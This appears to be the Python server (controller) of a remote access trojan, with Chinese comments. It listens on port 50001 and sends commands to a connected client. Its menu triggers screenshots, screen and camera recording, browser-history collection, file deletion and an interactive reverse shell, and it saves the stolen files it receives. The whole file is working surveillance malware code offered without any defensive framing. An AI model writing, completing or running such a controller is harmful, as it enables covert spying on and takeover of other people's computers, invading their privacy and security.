import socket  # 引入 socket 模組，用於建立網路連接
import struct  # 引入 struct 模組，用於處理二進位數據
import os  # 引入 os 模組，用於操作文件系統
import time  # 引入 time 模組，用於處理時間

def receive_file(conn):
    """從客戶端接收文件。"""
    fileinfo_size = struct.calcsize('128sl')  # 計算文件資訊結構的大小

    # 確保接收到足夠的數據
    buf = b''
    while len(buf) < fileinfo_size:
        packet = conn.recv(fileinfo_size - len(buf))  # 接收數據包
        if not packet:
            raise ConnectionError("Connection lost while receiving file info")  # 若連接丟失則引發錯誤
        buf += packet

    if len(buf) == fileinfo_size:
        filename, filesize = struct.unpack('128sl', buf)  # 解包文件資訊
        filename = filename.strip(b'\x00').decode()  # 去除文件名中的空字節並解碼

        timestamp = time.strftime("%Y%m%d_%H%M%S")  # 生成時間戳
        directory = os.path.join('./received_files', time.strftime("%Y/%m%d"))  # 設定保存文件的目錄
        os.makedirs(directory, exist_ok=True)  # 創建目錄

        base, ext = os.path.splitext(filename)  # 分離文件名和擴展名
        new_filename = os.path.join(directory, f"{timestamp}_{base}{ext}")  # 設定新文件名

        recvd_size = 0  # 已接收大小初始化為 0
        with open(new_filename, 'wb') as file:
            while recvd_size < filesize:
                chunk_size = min(filesize - recvd_size, 1024)  # 計算每次接收的數據塊大小
                data = conn.recv(chunk_size)  # 接收數據
                if not data:
                    print("Connection lost during file transfer")  # 若連接丟失則打印錯誤信息
                    break
                recvd_size += len(data)  # 更新已接收大小
                file.write(data)  # 將數據寫入文件

        # 確認結束標誌
        end_marker = conn.recv(1024)
        if end_marker != b"END":
            print(f"Unexpected end marker: {end_marker}")  # 若結束標誌不正確則打印錯誤信息

        print(f"{new_filename} 接收完")  # 打印文件接收完成信息
    else:
        print(f"Received data of incorrect size: expected {fileinfo_size}, got {len(buf)}")  # 若接收數據大小不正確則打印錯誤信息

def handle_reverse_shell(conn):
    """處理反向 shell 的指令。"""
    while True:
        cmd = input("Enter your command : ")  # 輸入指令
        if cmd == "exit":
            conn.send(cmd.encode())  # 發送退出指令
            break
        elif cmd[:4] == "down":
            conn.send(cmd.encode())  # 發送下載指令

            data = b""
            while True:
                end_data = conn.recv(1024)  # 接收數據

                # 如果收到 'Ended'，則停止接收
                if end_data == b"Ended":
                    print("File transfer ended :)")  # 打印文件傳輸完成信息
                    break

                data += end_data

            # 將收到的數據寫入文件
            f_name = input("Enter output file name: ")  # 輸入保存的文件名
            with open(f_name, "wb") as new_f:
                new_f.write(data)

        elif cmd:
            conn.send(cmd.encode())  # 發送指令到客戶端
            response = conn.recv(4096).decode()  # 調整緩衝區大小以接收回應
            print(response)  # 打印回應
        else:
            print("Command cannot be empty")  # 若指令為空則打印錯誤信息

def server_program():
    """伺服器主程序。"""
    host = '0.0.0.0'  # 伺服器監聽地址
    port = 50001  # 伺服器監聽端口

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 創建一個 TCP/IP socket
    server_socket.bind((host, port))  # 綁定地址和端口
    server_socket.listen(2)  # 設置最大連接數

    conn, address = server_socket.accept()  # 接受客戶端連接
    print(f"Connection from: {address}")  # 打印客戶端地址

    client_info = conn.recv(1024).decode()  # 接收客戶端信息
    print(client_info)  # 打印客戶端信息

    while True:
        command = input("Enter command : \n     1 for screenshots\n     2 for screen recording\n "
                        "    3 for camera recording\n     4 for reverse shell\n"
                        "     5 for web history\n     6 for file delete\n     7 for close\n => ")
        conn.send(command.encode())  # 發送指令到客戶端

        if command == '1':
            num_screenshots = input("Enter number of screenshots: ")  # 輸入截圖數量
            if num_screenshots.isdigit():
                num_screenshots = int(num_screenshots)
                conn.send(str(num_screenshots).encode())  # 發送截圖數量到客戶端
                for _ in range(num_screenshots):
                    receive_file(conn)  # 接收截圖文件
            else:
                print("Invalid number of screenshots")  # 若截圖數量無效則打印錯誤信息
        elif command == '2':
            receive_file(conn)  # 接收屏幕錄製文件
        elif command == '3':
            receive_file(conn)  # 接收電腦相機錄製文件
        elif command == '4':
            handle_reverse_shell(conn)  # 處理反向 shell 指令
        elif command == '5':
            receive_file(conn)  # 接收瀏覽歷史文件
        elif command == '6':
            print('刪除檔案')  # 打印刪除文件信息
        elif command == '7':
            print('電腦關機')  # 打印關機信息
            break

    conn.close()  # 關閉 socket 連接

if __name__ == '__main__':
    server_program()  # 執行伺服器程序
